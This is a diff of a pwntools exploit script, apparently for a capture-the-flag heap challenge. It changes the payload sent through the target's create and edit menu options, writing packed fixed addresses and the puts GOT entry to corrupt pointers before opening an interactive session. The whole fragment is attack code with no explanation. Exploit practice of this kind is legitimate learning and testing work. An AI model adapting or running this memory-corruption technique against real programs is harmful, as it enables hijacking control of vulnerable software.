@@ -19,11 +19,48 @@ def edit(index,name,kind,age):
         p.sendlineafter('> ',kind);sleep(t)
         p.sendlineafter('> ',age);sleep(t)
 
-create('a'*8,'b'*8,'0')
-edit('0','a','b','0')
-p.sendline('n')
 
-create(p64(puts_got),p64(puts_got)+p64(puts_got),'1')
-edit('1',p64(puts_got),p64(puts_got),'2')
+
+
+
+create('a'*8,'b'*8,'1')
+edit('0','a','b','1')
+p.sendline('n')
+p.recv()
+
+create('A'*8,p64(0x6020b0)+p64(0x6020a0+0x100),'2')
+
+p.recv()
+edit('0',p64(0x6020a0+0x100),p64(puts_got),'3')
+p.sendline('y')
+
+
 #p.sendline('y')
 p.interactive()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
